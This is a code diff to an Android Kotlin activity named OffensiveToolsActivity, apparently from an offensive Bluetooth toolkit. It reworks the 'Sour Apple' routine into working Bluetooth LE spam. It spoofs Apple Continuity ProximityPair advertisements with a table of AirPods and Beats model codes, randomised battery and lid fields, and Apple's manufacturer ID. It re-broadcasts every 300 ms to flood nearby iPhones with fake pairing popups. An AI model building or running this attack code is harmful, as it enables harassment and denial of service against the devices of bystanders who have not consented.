@@ -29,22 +29,25 @@ class OffensiveToolsActivity : Activity() {
     private var packetCount = 0
     private var currentCallback: AdvertiseCallback? = null
 
-    private val appleDevices = listOf(
-        byteArrayOf(0x10, 0x05, 0x01),
-        byteArrayOf(0x10, 0x02, 0x20),
-        byteArrayOf(0x10, 0x0A, 0x20),
-        byteArrayOf(0x10, 0x0E, 0x20),
-        byteArrayOf(0x10, 0x14, 0x20),
-        byteArrayOf(0x10, 0x00, 0x55),
-    )
-
-    private val appleActions = listOf(
-        byteArrayOf(0x09, 0x01),
-        byteArrayOf(0x06, 0x02),
-        byteArrayOf(0x0B, 0x01),
-        byteArrayOf(0x0D, 0x04),
-        byteArrayOf(0x07, 0x06),
-        byteArrayOf(0x14, 0x06),
+    // Apple Continuity ProximityPair device models (2 bytes each)
+    private val appleDeviceModels = listOf(
+        byteArrayOf(0x0E, 0x20), // AirPods Pro
+        byteArrayOf(0x0A, 0x20), // AirPods Max
+        byteArrayOf(0x02, 0x20), // AirPods
+        byteArrayOf(0x0F, 0x20), // AirPods 2nd Gen
+        byteArrayOf(0x13, 0x20), // AirPods 3rd Gen
+        byteArrayOf(0x14, 0x20), // AirPods Pro 2nd Gen
+        byteArrayOf(0x10, 0x20), // Beats Flex
+        byteArrayOf(0x06, 0x20), // Beats Solo 3
+        byteArrayOf(0x03, 0x20), // Powerbeats 3
+        byteArrayOf(0x0B, 0x20), // Powerbeats Pro
+        byteArrayOf(0x0C, 0x20), // Beats Solo Pro
+        byteArrayOf(0x11, 0x20), // Beats Studio Buds
+        byteArrayOf(0x05, 0x20), // Beats X
+        byteArrayOf(0x09, 0x20), // Beats Studio 3
+        byteArrayOf(0x17, 0x20), // Beats Studio Pro
+        byteArrayOf(0x12, 0x20), // Beats Fit Pro
+        byteArrayOf(0x16, 0x20), // Beats Studio Buds+
     )
 
     private val spamNames = listOf(
@@ -247,22 +250,33 @@ class OffensiveToolsActivity : Activity() {
     }
 
     // ─── SOUR APPLE ───
+    // Format from simondankelmann/Bluetooth-LE-Spam (proven working)
+    // Continuity type 0x07 = ProximityPair
+    // Payload: type(1) + size(1) + prefix(1) + device(2) + status(1) + battery(1) + case(1) + lid(1) + color(1) + 00 + random(16)
     private fun startSourApple() {
         val runnable = object : Runnable {
             override fun run() {
                 if (!isAttacking) return
 
-                val device = appleDevices.random()
-                val action = appleActions.random()
+                val device = appleDeviceModels.random()
+                val rand = java.util.Random()
 
-                val mfgData = ByteArray(17)
-                mfgData[0] = 0x02
-                mfgData[1] = 0x15
-                System.arraycopy(device, 0, mfgData, 2, device.size.coerceAtMost(3))
-                System.arraycopy(action, 0, mfgData, 5, action.size.coerceAtMost(2))
-                for (i in 7 until mfgData.size) mfgData[i] = (Math.random() * 256).toInt().toByte()
+                val payload = ByteArray(27)
+                payload[0] = 0x07                              // Continuity type: ProximityPair
+                payload[1] = 0x19                              // Payload size: 25
+                payload[2] = 0x07                              // Prefix: NEW DEVICE
+                payload[3] = device[0]                         // Device model byte 1
+                payload[4] = device[1]                         // Device model byte 2
+                payload[5] = 0x55                              // Status
+                payload[6] = ((rand.nextInt(10) shl 4) or rand.nextInt(10)).toByte()  // Buds battery
+                payload[7] = ((rand.nextInt(8) shl 4) or rand.nextInt(10)).toByte()   // Case battery
+                payload[8] = rand.nextInt(256).toByte()        // Lid open counter
+                payload[9] = 0x00                              // Color
+                payload[10] = 0x00                             // Padding
+                // Fill remaining 16 bytes with random data
+                for (i in 11 until 27) payload[i] = rand.nextInt(256).toByte()
 
-                val data = BleAdvertiseHelper.buildManufacturerData(0x004C, mfgData)
+                val data = BleAdvertiseHelper.buildManufacturerData(0x004C, payload)
                 safeAdvertise(data)
 
                 handler.postDelayed(this, 300)
